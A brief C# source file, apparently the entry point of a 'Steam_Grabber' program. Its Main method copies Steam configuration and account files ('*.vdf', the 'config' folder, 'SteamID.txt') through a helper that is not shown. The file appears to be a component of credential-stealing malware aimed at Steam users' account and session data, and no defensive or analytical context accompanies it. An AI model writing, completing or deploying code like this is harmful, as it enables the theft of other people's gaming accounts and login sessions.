namespace Steam_Grabber
{
    internal static partial class Program
    {
        private static void Main() => 
            GetSteamFiles.Copy("*.", "*.vdf", "Steam", "config", "SteamID.txt");
    }
}